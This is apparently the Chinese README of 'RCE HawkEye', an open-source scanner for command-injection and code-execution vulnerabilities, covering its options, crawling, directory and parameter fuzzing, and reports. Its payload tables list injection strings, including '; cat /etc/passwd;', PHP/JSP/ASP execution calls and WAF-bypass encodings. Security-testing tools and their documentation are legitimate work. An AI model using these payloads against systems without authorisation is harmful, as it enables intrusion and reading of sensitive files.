# RCE HawkEye (RCE鹰眼)

<p align="center">
  <img src="https://img.shields.io/badge/version-0.0.3-blue.svg" alt="Version">
  <img src="https://img.shields.io/badge/python-3.8+-green.svg" alt="Python">
  <img src="https://img.shields.io/badge/license-MIT-orange.svg" alt="License">
  <img src="https://img.shields.io/badge/author-hbzw-red.svg" alt="Author">
</p>

<p align="center">
  <b>命令执行漏洞自动化检测工具</b>
</p>

---

## 📖 项目简介

**RCE HawkEye（RCE鹰眼）** 是一款专业的命令执行漏洞自动化检测工具，能够对目标系统或应用程序的输入点进行自动化扫描，识别可能存在的命令注入和代码执行风险。

### ✨ 核心特性

- 🔍 **多维度扫描** - 支持 URL 参数、表单、HTTP 头、Cookie、POST 数据等多种输入点
- 🌐 **多语言支持** - 自动识别 PHP/JSP/ASP/ASPX/Python 等语言的代码执行漏洞
- 🕷️ **智能爬虫** - 自动爬取网站路径和参数，发现隐藏的注入点
- 📂 **目录扫描** - 集成字典扫描，发现隐藏目录和敏感文件
- 🎯 **参数模糊测试** - 使用字典发现隐藏参数，支持 GET/POST 双模式
- 🔧 **交互式选择** - 目录扫描后可按状态码或通配符选择要测试的路径
- 🎯 **多种检测模式** - 无害化检测、常规回显检测、WAF 绕过检测
- 📦 **流量包解析** - 支持从文本文件解析 HTTP 流量包进行检测
- 📊 **详细报告** - JSON/HTML/Markdown 多格式报告，包含完整响应内容
- ⚙️ **灵活配置** - 支持域名白名单/黑名单、自定义字典等配置
- 🛡️ **安全测试** - 无害化模式使用时间盲注，不执行实际命令

---

## 🚀 快速开始

### 环境要求

- Python 3.8+
- Windows / Linux / macOS

### 安装

```bash
# 克隆项目
git clone https://github.com/hbzw/RCE_HawkEye.git
cd RCE_HawkEye

# 安装依赖
pip install -r requirements.txt
```

### 基本使用

```bash
# 扫描单个 URL
python RCE_HawkEye.py -u "http://example.com/api?cmd=test"

# 从流量包文件扫描
python RCE_HawkEye.py -r traffic.txt

# 从文件读取目标 URL
python RCE_HawkEye.py -f targets.txt

# 爬取网站并扫描
python RCE_HawkEye.py -u "http://example.com" --crawl

# 目录扫描 + 参数模糊测试
python RCE_HawkEye.py -u "http://example.com" --dir-scan --param-fuzz
```

---

## 📚 详细用法

### 命令行参数

#### 基本参数

| 参数 | 说明 |
|------|------|
| `-u, --url` | 目标 URL |
| `-r, --raw-traffic` | 流量包文件路径 |
| `-f, --file` | 目标 URL 文件路径 |

#### 扫描选项

| 参数 | 说明 |
|------|------|
| `--crawl` | 启用网页爬虫 |
| `--crawl-depth` | 爬虫深度 (默认: 2) |
| `--crawl-pages` | 最大爬取页面数 (默认: 100) |
| `--dir-scan` | 启用目录扫描 |
| `--dir-wordlist` | 目录扫描字典文件 |
| `--dir-threads` | 目录扫描线程数 (默认: 10) |
| `--param-fuzz` | 启用参数模糊测试 |
| `--param-wordlist` | 参数模糊测试字典文件 |

#### 域名控制

| 参数 | 说明 |
|------|------|
| `--allow-domains` | 域名白名单 (逗号分隔) |
| `--block-domains` | 域名黑名单 (逗号分隔) |
| `--restrict-root` | 限制在根域名 |

#### HTTP 选项

| 参数 | 说明 |
|------|------|
| `-m, --method` | HTTP 方法 (GET/POST) |
| `-d, --data` | POST 数据 |
| `-H, --header` | 自定义请求头 |
| `-c, --concurrent` | 并发数 (默认: 10) |
| `-t, --timeout` | 超时时间/秒 (默认: 10) |

#### 输出选项

| 参数 | 说明 |
|------|------|
| `-o, --output-format` | 报告格式 (json/html/md/all) |
| `-O, --output-file` | 输出文件路径 |
| `-v, --verbose` | 详细输出 |
| `-q, --quiet` | 静默模式 |

#### 扫描模式

| 参数 | 说明 |
|------|------|
| `--no-interactive` | 非交互模式 |
| `--harmless` | 无害化检测模式 |
| `--echo` | 常规回显模式 |
| `--waf-bypass` | WAF 绕过模式 |

---

## 🎯 扫描模式

### 1. 无害化检测模式 (`--harmless`)

使用时间盲注 payload（sleep/timeout），不执行实际命令，适合生产环境测试。

```bash
python RCE_HawkEye.py -u "http://example.com" --no-interactive --harmless
```

### 2. 常规回显模式 (`--echo`)

使用 ls、whoami、id 等命令，可直接获取命令执行结果。

```bash
python RCE_HawkEye.py -u "http://example.com" --no-interactive --echo
```

### 3. WAF 绕过模式 (`--waf-bypass`)

使用编码、特殊字符等技术绕过 WAF 防护。

```bash
python RCE_HawkEye.py -u "http://example.com" --no-interactive --waf-bypass
```

---

## 📂 目录扫描

自动扫描隐藏目录和文件：

```bash
# 基本目录扫描
python RCE_HawkEye.py -u "http://example.com" --dir-scan

# 使用自定义字典
python RCE_HawkEye.py -u "http://example.com" --dir-scan --dir-wordlist my_dirs.txt

# 设置线程数
python RCE_HawkEye.py -u "http://example.com" --dir-scan --dir-threads 20
```

### 交互式路径选择

目录扫描完成后，可以按状态码或通配符选择要进行参数扫描的路径：

```
============================================================
选择要进行参数扫描的路径
============================================================
输入格式:
  - 状态码: 200,301,302
  - 目录通配符: admin*, *.php, *shell*
  - 组合: 200,admin*,*.php
  - 直接回车: 扫描全部路径
------------------------------------------------------------
请输入过滤条件 [默认:全部]: 200,*.php
[+] 已选择 5 个路径进行参数扫描
```

---

## 🎯 参数模糊测试

使用字典发现隐藏参数，支持 GET 和 POST 双模式：

```bash
# 基本参数模糊测试
python RCE_HawkEye.py -u "http://example.com" --param-fuzz

# 使用自定义字典
python RCE_HawkEye.py -u "http://example.com" --param-fuzz --param-wordlist my_params.txt

# 目录扫描 + 参数模糊测试
python RCE_HawkEye.py -u "http://example.com" --dir-scan --param-fuzz
```

---

## 🌐 多语言代码执行检测

自动根据 URL 后缀选择对应的代码执行 payload：

| 语言 | URL 后缀 | 检测函数 |
|------|---------|---------|
| PHP | `.php`, `.phtml` | `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` |
| JSP | `.jsp`, `.jspx` | `Runtime.exec()`, `ProcessBuilder`, EL 表达式 |
| ASP | `.asp` | `WScript.Shell` |
| ASPX | `.aspx`, `.ashx` | `System.Diagnostics.Process.Start()` |
| Python | `.py`, `.cgi` | `__import__()`, `eval()`, `exec()`, `subprocess` |

---

## 🕷️ 网页爬虫

自动爬取网站，发现路径和参数：

```bash
# 基本爬取
python RCE_HawkEye.py -u "http://example.com" --crawl

# 设置爬取深度和页面数
python RCE_HawkEye.py -u "http://example.com" --crawl --crawl-depth 3 --crawl-pages 50

# 限制域名
python RCE_HawkEye.py -u "http://example.com" --crawl --allow-domains example.com,api.example.com
```

---

## 📦 流量包解析

支持解析 HTTP 流量包文件：

```
POST /api/exec HTTP/1.1
Content-Type: application/json
Host: www.example.com

{"cmd": "test", "args": "value"}
```

```bash
python RCE_HawkEye.py -r traffic.txt --no-interactive --harmless
```

---

## 📁 项目结构

```
RCE_HawkEye/
├── rce_hawkeye/             # 核心模块
│   ├── __init__.py          # 模块入口
│   ├── scanner.py           # 核心扫描器
│   ├── detector.py          # 漏洞检测器
│   ├── payload_generator.py # Payload 生成器
│   ├── reporter.py          # 报告生成器
│   ├── crawler.py           # 网页爬虫
│   ├── dir_scanner.py       # 目录扫描器
│   ├── param_extractor.py   # 参数提取器
│   ├── traffic_parser.py    # 流量包解析器
│   ├── config.py            # 配置管理
│   └── utils.py             # 工具函数
├── config/
│   ├── default.yaml         # 默认配置
│   ├── payloads.yaml        # Payload 库
│   └── wordlists/           # 字典文件
│       ├── dirs.txt         # 目录字典
│       └── params.txt       # 参数字典
├── examples/
│   ├── targets.txt          # 目标示例
│   ├── traffic.txt          # 流量包示例
│   └── usage_examples.py    # 使用示例
├── reports/                 # 报告输出目录
├── RCE_HawkEye.py           # 命令行入口
├── requirements.txt         # 依赖文件
├── LICENSE                  # 许可证
└── README.md                # 说明文档
```

---

## 🎯 Payload 类型

### 时间盲注 Payload

| 平台 | Payload 示例 |
|------|-------------|
| Unix | `; sleep 5;` |
| Unix | `\| sleep 5` |
| Unix | `` `sleep 5` `` |
| Unix | `$(sleep 5)` |
| Windows | `& timeout 5` |
| Windows | `\| ping -n 5 127.0.0.1` |

### 回显型 Payload

| 平台 | Payload 示例 | 说明 |
|------|-------------|------|
| Unix | `; ls -la;` | 列出目录 |
| Unix | `; whoami;` | 当前用户 |
| Unix | `; id;` | 用户 ID |
| Unix | `; pwd;` | 当前路径 |
| Unix | `; cat /etc/passwd;` | 读取文件 |
| Windows | `& dir` | 列出目录 |
| Windows | `& whoami` | 当前用户 |

### 代码执行 Payload

| 语言 | Payload 示例 |
|------|-------------|
| PHP | `system('ls');` |
| PHP | `passthru('whoami');` |
| PHP | `shell_exec('id');` |
| JSP | `<%Runtime.getRuntime().exec("ls");%>` |
| ASP | `<%Set shell=Server.CreateObject("WScript.Shell")%>` |
| Python | `__import__('os').system('ls')` |

### WAF 绕过 Payload

| 技术 | Payload 示例 |
|------|-------------|
| 引号分割 | `; l''s;` |
| 反斜杠 | `; l\s;` |
| 变量切片 | `; l${PATH:0:0}s;` |
| IFS 替换 | `;${IFS}ls;` |
| URL 编码 | `%0als` |
| Base64 | `$(echo'bHM='\|base64-d)` |

---

## ⚙️ 配置文件

`config/default.yaml`:

```yaml
scanner:
  timeout: 10
  max_concurrent: 10
  delay_threshold: 4.0

dir_scan:
  enabled: true
  threads: 10
  wordlist: "config/wordlists/dirs.txt"
  extensions:
    - ".php"
    - ".asp"
    - ".jsp"
    - ".html"

param_extract:
  enabled: true
  param_wordlist: "config/wordlists/params.txt"

domain:
  restrict_to_root: true
  blocked_domains:
    - "localhost"
    - "127.0.0.1"
    - "*.gov.cn"
```

---

## 🔧 作为库使用

```python
import asyncio
from rce_hawkeye import Scanner, Reporter
from rce_hawkeye.scanner import ScanTarget
from rce_hawkeye.payload_generator import ScanMode

async def main():
    scanner = Scanner(timeout=10, max_concurrent=5)
    scanner.set_scan_mode(ScanMode.ECHO)
    
    target = ScanTarget(
        url="http://example.com/api?cmd=test",
        method="GET"
    )
    
    results = await scanner.scan([target])
    
    reporter = Reporter()
    reporter.save_report(
        scanner.get_vulnerabilities(),
        format="html"
    )

asyncio.run(main())
```

---

## 📊 报告示例

### JSON 格式

```json
{
  "scan_time": "2024-01-15 10:30:00",
  "total_targets": 10,
  "vulnerabilities": [
    {
      "target": "http://example.com/api?cmd=test",
      "parameter": "cmd",
      "type": "echo_based",
      "severity": "critical",
      "payload": "; whoami;",
      "evidence": "www-data"
    }
  ]
}
```

---

## ⚠️ 免责声明

本工具仅供**授权的安全测试**使用。在未获得明确授权的情况下，禁止对他人系统进行扫描测试。使用本工具所产生的一切后果由使用者自行承担，与作者无关。

---

## 📄 许可证

本项目采用 MIT 许可证。详见 [LICENSE](LICENSE) 文件。

---

## 🤝 贡献指南

欢迎提交 Issue 和 Pull Request！

### 贡献方式

1. Fork 本仓库
2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 提交 Pull Request

### 代码规范

- 使用 Python 3.8+ 语法
- 遵循 PEP 8 代码风格
- 添加必要的注释和文档

---

## 📮 联系方式

- Author: hbzw
- QQ：980702918
- Version: 0.0.3

---

## 📝 更新日志

### v0.0.3 (2024-02-14)

- ✨ 新增目录扫描功能
- ✨ 新增参数模糊测试功能
- ✨ 新增多语言代码执行检测 (PHP/JSP/ASP/ASPX/Python)
- ✨ 新增交互式路径选择功能
- ✨ 新增 POST 参数扫描支持
- 🐛 修复交互模式下的多个问题
- 📝 完善文档和示例

---

<p align="center">
  <b>⭐ 如果这个项目对你有帮助，请给一个 Star ⭐</b>
</p>

